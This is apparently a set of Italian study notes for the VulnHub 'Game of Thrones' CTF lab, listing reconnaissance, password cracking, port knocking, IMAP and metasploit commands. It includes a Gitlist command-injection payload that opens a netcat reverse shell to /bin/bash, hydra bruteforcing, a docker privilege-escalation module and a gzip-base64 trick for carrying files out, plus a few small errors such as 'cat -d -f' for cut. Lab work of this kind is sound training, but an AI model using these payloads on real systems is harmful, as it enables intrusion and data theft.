# CTF Game of Thrones

```
 _____                      ___    _____ _                       
|   __|___ _____ ___    ___|  _|  |_   _| |_ ___ ___ ___ ___ ___ 
|  |  | .'|     | -_|  | . |  _|    | | |   |  _| . |   | -_|_ -|
|_____|__,|_|_|_|___|  |___|_|      |_| |_|_|_| |___|_|_|___|___|
```



https://www.vulnhub.com/entry/game-of-thrones-ctf-1,201/

___

*ricognizione*

chiamata 0 touch perchè non lascia traccie

`arp-scan -l`

vediamo cosa c'è sulla rete

protocollo arp - livello 2 iso osi

troviamo l'ip della macchina da attaccare

___

-- durante i penetration testing va documentato tutto, anche la preparazione

___

cerchiamo porte aperte

`nmap indirizzo_ip -n -Pn -p-`

namp non è parallelo, aspetta sempre la risposta, più accurato ma più lento

mascan (?) per lo scan in parallelo

-p- tutte le porte

-n non fa conversione dns-ip

--open per visualizzare solo porte aperte

-Pn non fa probing

___

nsa nmap script engine, scritto in lua

permette di fare banner grabbing

ci permette anche di capire che client sta girando su una porta specifica

permette di fare test per auth, broadcasting, attacchi dos, fuzzing, bruteforcing, detectare backdor

script.db = cartella con i script

$ nmap indirizzo_ip [options] --script=nome_script

___

-T permette di determinare la velocità dello scan da 1 a 5

-T0 molto lento, non parallelo

-T4 aggressive, lascia tracce

-T5 insane

___

-iL nome_file, fa lo scan sulla lista di ip definita nel file

___

-O identifica il sistema operativo

si può capire anche solo dalle porte 

3389 windows

135, 137, 139 windows domain controller

22 linux

___

-sC fa vulnerability assertment

___

--reason spiega perchè una porta è stat classificata in un certo modo

___

-vvv very very verbose

___

`nmap indirizzo_ip -n -Pn -p- -sV`

-sV bannergrabbing, vediamo cosa gira sui servizi

trovao le versione di alcuni servizi che girano sulle porte, possiamo provare exploit per alcune versioni vulnerabili

___

`wget url`

scarica il file della pagina

___

`dirb url | tee dirb.txt`

dirb bruteforce di tutti gli url per vedere  quelli disponibili

tee fa vedere l'output a schermo e lo redirige su un file

___

`cat dirb.txt | grep 200`

vediam solo le pagine che hanno risposto 200 'OK'

___

robots.txt indica ai crawler quali pagine possono essere trovate nel sito

usato per migliorare le indicizzazzioni

si può utilizzare per mappare il sito

___

user agent

necessario avere l'user agent giusto per entrare in alcune pagine

devtools - more tools - network condition - user agent custom 

`curl -A  "user_agent_che_voglio_utilizzare" url`

___

#exitfool file_name

legge i metadata di un file 

___

`ftp indirizzo_ip`

connessione ftp, user e pwd vengono chiesti dopo

`get nome_file` 

trasferisce i file dal server ftp alla propria macchina

___

fail2ban protegge dai bruteforce, aggiunge regole al firewall per bloccare dopo un tot di richieste 

può aggiungere regole per kickare l'utente dopo un tot di tempo di inattività

___

`mcrypt -d file_name`

encryption e decription tool

___

`hashcat`

per decifrare vari hash, come johntheripper

nel nostro caso la pwd è nel formato md5(md5($.salt)$.pwd)

hashcat --help | grep md5 per vedere le possibili funzioni con  md5

rules applica regole alla wordlist 

rockyou wordlist

`hashcat -m 20 -a 0 file_name wordlist_file -r rule_file`

-m modalità 20=md5($salt.$pwd)

-a stipologia di attacco 0=dizionario 1=combination 3=maschera 6e7=hybridmode (mask + wordlist)

si possono specificare più wordlist

___

`echo -n string | md5sum`

converte la stringa in md5

___

`echo stringa >> file_name`

appende la stringa al file

___

`strings nome_file`

permette di trovare unstructured data all'interno del file

es estrae il testo da un file/eseguibilie

___

`nslookup -q=TXT stringa indirizzo_ip`

lookup del dns  --non ho capito

___

`searchsploit nome_servizio`

cerca exploit disponibili (in exploitdb, quindi in locale) per varie versioni del servizio

___

`metasploit`

open source exploitation framework

si possono usare exploit trovati con searchsplit

msf6 > `search nome_servizio`

per cercare exploit per un servizio

`use nome_modulo` o `use #_module`

seleziona il modulo

`show options`

mostra i settings del modulo e i valori correnti

`set NOME_SETTING valore_setting`

impostart i setting (ATTENZIONE c'è nessun feedback in caso di errore)

`exploit`

per lanciare l'exploit

-z per eseguirlo in background

`sessions` visualizza le sessioni attive

`-i id_sessione` si collega alla sessione in background con id specificato

___

`psql -h host_name nome_db nome_utente`

connette ad un database sql

chiede la password

___

*cifrario di cesare* 

cifratura semplice che ruota l'alfabeto secondo un certo indice

`cryptool`

tool gui per decifrare 

------

`cat nome_file -d "|" -f 2`

-d specifica un delimitatore per dividere le righe

-f indica l'indice del campo da ritornare

`cat nome_file | while read user; do psql -h host_macchina -d database -U $user; done `

leggi ogni riga -> assegna ad user -> passalo a psql

------

`GRANT ALL PRIVILIGES ON ALL TABLES IN SCHEMA nome_schema TO nome_utente;`

da tutti i privilegi all'utente specificato, se possibile

------

`echo base64_string | base64 -d`

decodifica base64

le stringe base64 si riconoscono perchè finiscono con `==`

------

**knocking** - tecnica per inviare tentativi di connessione ad un firewall ad intervalli predefiniti per aprire una porta

bussiamo alla porta imap per farla passare da `filtered` a `open`

`knock` tool per fare knocking, non preinstallato

metodo manuale:

- creo un file con la lista di porte

- `cat knock.txt | while read port; do nc -vz host_macchina $port; done`

  `nc` netcat

  -v verbose

  -z no interaction

si può fare anche con namp: `cat knock.txt | while read port; do nmap host_macchina -Pn --host-timeout 201 --max-retries 0 -p $port; done`

------

`telnet host_macchina porta_su_cui_connettersi`

si connette al servizio sulla porta specificata

kicka l'utente dopo un certo periodo di inattività

---

**imap** servizio mail

`a login email_utente password`

`. LIST "" "*"` visualizza la struttura della casella di posta

`a SELECT nome_directory`  visualizza il contenuto della dir

`. FETCH id_mail ALL` ritorna l'intera mail con id specificato `. FETCH id_mail BODY[]` molto meglio, formattato

---

`echo stringa_esadecimale | xxd -r -p`

converte stringa esadecimale

---

**Gitlist**

`searchsploit gitlist` cerchiamo exploit per il servizio

`http://route/%22%22%60 comando bash %60`  la vulnerabilità è `""'`, `%22%22%60` si traduce in questo

`nc -nvlp 5555` netcat rimane in ascolto (-l) sulla porta (-p) 555 senza fare traduzione dns (-n)

`http://route/%22%22%60 ip_locale 5555-e /bin/bash %60` restituisce la connessione indietro

---

`ssh utente@host_macchina -L porta_locale:host_macchina_2:porta_macchina_2`

crea un tunnel ssh dalla porta locale su macchina_2

---

`hydra -l nome_utente -P wordlist host_macchina`

tool per bruteforce di password

---

**privilage escalation**

`msfconsole` metasploit - exploitation framework

`scanner/ssh/ssh_login` avviamo metasploit in ssh sulla macchina da attaccare

`/docker_deamon_privilege_escalation`

---

`cat nome_file | gzip | base64`

metodo per portare fuori un file tramite copia-incolla



